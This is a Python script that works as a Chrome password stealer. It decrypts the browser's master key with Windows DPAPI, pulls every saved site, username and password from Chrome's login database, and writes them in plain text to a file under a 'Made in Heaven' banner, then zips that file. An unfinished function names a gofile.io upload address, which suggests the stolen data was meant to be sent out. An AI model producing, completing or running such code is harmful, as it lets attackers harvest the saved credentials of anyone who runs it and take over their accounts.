import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta
import requests
import zipfile

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""
        

def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()

    # Créer un fichier texte pour écrire les données décryptées
    with open('decrypted_passwords.txt', 'w', encoding='utf-8') as output_file:
        output_file.write("___  ___          _        _         _   _\n")
        output_file.write("|  \\/  |         | |      (_)       | | | |\n")
        output_file.write("| .  . | __ _  __| | ___   _ _ __   | |_| | ___  __ ___   _____ _ __\n")
        output_file.write("| |\\/| |/ _` |/ _` |/ _ \\ | | '_ \  |  _  |/ _ \\/ _` \\ \\ / / _ \\ '_ \n")
        output_file.write("| |  | | (_| | (_| |  __/ | | | | | | | | |  __/ (_| |\\ V /  __/ | | |\n")
        output_file.write("\\_|  |_/\\__,_|\\__,_|\\___| |_|_| |_| \\_| |_|\\___|\\__,_| \\_/ \\___|_| |_|\n")
        output_file.write("\n")

        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]

            if username or password:
                output_file.write(f"Origin URL: {origin_url}\n")
                output_file.write(f"Action URL: {action_url}\n")
                output_file.write(f"Username: {username}\n")
                output_file.write(f"Password: {password}\n")
            else:
                continue

            if date_created != 86400000000 and date_created:
                output_file.write(f"Creation date: {str(get_chrome_datetime(date_created))}\n")
            if date_last_used != 86400000000 and date_last_used:
                output_file.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
            output_file.write("="*50 + "\n")

    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass

    # Zipper le fichier texte
    with zipfile.ZipFile('decrypted_passwords.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.write('decrypted_passwords.txt')

def uploadgofile():
    upload_url = 'https://api.gofile.io/uploadFile'


if __name__ == "__main__":
    main()
















